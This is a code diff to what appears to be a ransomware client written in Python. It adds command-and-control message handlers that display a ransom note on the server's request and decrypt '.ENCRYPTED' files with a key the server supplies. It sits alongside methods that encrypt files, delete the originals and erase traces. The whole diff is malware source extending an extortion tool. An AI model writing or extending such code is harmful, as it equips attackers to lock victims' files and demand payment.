@@ -202,10 +202,11 @@ class Program():
     def decrypt(self):
         if self.__criptography is None:
             print("Cryptography not set up. Please run 'setup' first.")
-            return
+            return False
 
         for file in self.__found_files:
             self.__criptography.decrypt(file + ".ENCRYPTED")
+        return True
 
     def delete_traces(self):
         print("Deleting traces...")
@@ -350,10 +351,29 @@ class Program():
             
             case "ransomnote_req":
                 print("Ransom note request received from C2 server.")
-                pass
+                self.__ransomnote()
+                message_reply["type"] = "ransomnote_rep"
+                message_reply["data"] = {}
+                
             case "decryption_rep":
                 print("Decryption reply received from C2 server.")
-                pass
+                should_decrypt = message_data.get("status", False)
+                result = False
+
+                if should_decrypt:
+                    key = message_data.get("key", None)
+                    if self.__criptography is None:
+                        self.__setup(
+                            should_encrypt=True,
+                            should_delete_original=True,
+                            c2_mode=True
+                        )
+                    self.__criptography.set_key(key.encode())
+                    result = self.decrypt()
+
+                message_reply["type"] = "decryption_res"
+                message_reply["data"] = {"result": result}
+                
             case "cleaning_req":
                 print("Cleaning request received from C2 server.")
                 pass
